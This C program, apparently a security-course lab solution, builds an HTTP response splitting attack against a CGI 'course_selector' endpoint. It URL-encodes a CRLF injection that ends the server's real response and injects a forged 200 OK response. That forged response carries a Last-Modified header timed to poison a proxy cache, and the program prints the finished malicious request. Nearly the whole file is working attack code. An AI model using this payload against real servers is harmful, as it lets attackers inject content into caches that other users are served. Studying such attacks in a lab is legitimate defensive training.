#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define YOUR_ID "123456789"
#define ONE_HOUR 3600

/**
 * Generates an RFC 1123 formatted timestamp for the Last-Modified header.
 * The timestamp is set to exactly 1 hour before the current time.
 * 
 * This ensures the proxy cache formula Cache_Time = (Current_Time - Last_Modified) * 0.1
 * gives us approximately 360 seconds (6 minutes) of cache duration.
 * 
 * @param buffer Output buffer to store the formatted timestamp
 * @param buffer_size Size of the output buffer
 */
void generate_last_modified(char *buffer, size_t buffer_size) {
    time_t current_time = time(NULL);
    time_t modified_time = current_time - ONE_HOUR;
    
    struct tm *gmt = gmtime(&modified_time);
    
    strftime(buffer, buffer_size, "%a, %d %b %Y %H:%M:%S GMT", gmt);
}

/**
 * URL-encodes a string according to RFC 3986.
 * 
 * Encodes all characters except unreserved characters (A-Z, a-z, 0-9, -, _, ., ~).
 * Spaces are converted to '+'. All other characters are percent-encoded as %XX.
 * 
 * @param str Input string to encode
 * @return Pointer to static buffer containing the encoded string
 */
char* url_encode(const char *str) {
    static char encoded[8192];
    char *ptr = encoded;
    
    while (*str) {
        if ((*str >= 'A' && *str <= 'Z') ||
            (*str >= 'a' && *str <= 'z') ||
            (*str >= '0' && *str <= '9') ||
            *str == '-' || *str == '_' || *str == '.' || *str == '~') {
            *ptr++ = *str;
        } else if (*str == ' ') {
            *ptr++ = '+';
        } else {
            sprintf(ptr, "%%%02X", (unsigned char)*str);
            ptr += 3;
        }
        str++;
    }
    *ptr = '\0';
    
    return encoded;
}

/**
 * Constructs the complete HTTP request with response splitting payload.
 * 
 * Creates a GET request to /cgi-bin/course_selector with a malicious 'course' parameter.
 * The parameter contains a URL-encoded HTTP response splitting attack that:
 * 1. Breaks out of the original response with CRLF injection
 * 2. Terminates the first response with Content-Length: 0
 * 3. Injects a second HTTP/1.1 200 OK response with:
 *    - Calculated Content-Length matching the body size
 *    - Last-Modified header (current time - 1 hour) for cache control
 *    - Content-Type: text/html
 *    - Body containing <HTML>[YOUR_ID]</HTML>
 * 
 * @return Pointer to static buffer containing the full HTTP request
 */
char* build_full_request() {
    char last_modified[128];
    generate_last_modified(last_modified, sizeof(last_modified));
    
    char body[256];
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
    
    int body_length = strlen(body);
    
    char second_response[2048];
    snprintf(second_response, sizeof(second_response),
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: %d\r\n"
        "Last-Modified: %s\r\n"
        "Content-Type: text/html\r\n"
        "\r\n"
        "%s",
        body_length,
        last_modified,
        body
    );
    
    char injection[4096];
    snprintf(injection, sizeof(injection),
        "\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
        "%s",
        second_response
    );
    
    char *encoded = url_encode(injection);
    
    static char full_request[16384];
    snprintf(full_request, sizeof(full_request),
        "GET /cgi-bin/course_selector?course=%s HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Connection: close\r\n"
        "\r\n",
        encoded
    );
    
    return full_request;
}

int main() {
    printf("=== HTTP Response Splitting Attack Payload ===\n\n");
    
    char last_modified[128];
    generate_last_modified(last_modified, sizeof(last_modified));
    printf("Generated Last-Modified: %s\n\n", last_modified);
    
    char body[256];
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
    printf("Body: %s\n", body);
    printf("Body Length: %zu\n\n", strlen(body));
    
    printf("=== Full Request ===\n");
    printf("%s\n", build_full_request());
    
    return 0;
}
